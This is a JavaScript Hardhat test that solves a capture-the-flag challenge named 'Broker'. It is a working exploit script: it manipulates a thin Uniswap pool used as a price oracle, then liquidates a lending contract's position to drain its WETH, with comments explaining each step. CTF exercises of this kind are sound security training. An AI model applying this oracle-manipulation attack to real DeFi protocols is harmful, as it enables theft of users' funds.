const { expect } = require("chai");

async function getChallenge() {
  const [deployer, player] = await ethers.getSigners();
  const setupFactory = await ethers.getContractFactory(`contracts/broker/public/contracts/Setup.sol:Setup`);
  const brokerFactory = await ethers.getContractFactory(`contracts/broker/public/contracts/Broker.sol:Broker`);
  const setup = await setupFactory.deploy({value: ethers.parseEther("50")});
  const broker = brokerFactory.attach(await setup.broker());
  return { setup, broker, player };
}

it("Solves Broker", async function () {
  const { setup, broker, player } = await getChallenge();

  // This is a challenge to manipulate the price in uniswap in order to perform liquidation of a lending contract.
  // 
  // The `broker` contract uses uniswap price as oracle for testing liquidation, and since the liquidity is small,
  // we can simply increase the token/weth price to liquidate the original setup user.

  const interface = ethers.Interface.from([
    "function balanceOf(address) returns (uint256)",
    "function transfer(address dst, uint qty) public returns (bool)",
    "function deposit()",
    "function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data)",
    "function liquidate(address user, uint256 amount) public returns (uint256)",
    "function approve(address to, uint256 amount) public returns (bool)",
  ]);

  // 1. Swap to get weth.
  await player.sendTransaction({
    to: setup.weth(),
    data: interface.encodeFunctionData("deposit", []),
    value: ethers.parseEther("5000"),
  });

  // 2. Swap in uniswap to tamper the price.
  await player.sendTransaction({
    to: setup.weth(),
    data: interface.encodeFunctionData("transfer", [await setup.pair(), ethers.parseEther("5000")]),
  });
  await player.sendTransaction({
    to: setup.pair(),
    data: interface.encodeFunctionData("swap", [0, ethers.parseEther("400000"), await player.getAddress(), "0x"]),
  });

  // 3. Liquidate the setup account to drain the weth tokens in broker.
  await player.sendTransaction({
    to: setup.token(),
    data: interface.encodeFunctionData("approve", [await setup.broker(), ethers.parseEther("9999999999999")]),
  });
  await player.sendTransaction({
    to: setup.broker(),
    data: interface.encodeFunctionData("liquidate", [await setup.getAddress(), ethers.parseEther("475")]),
  });

  expect(await setup.isSolved()).to.equal(true);
});
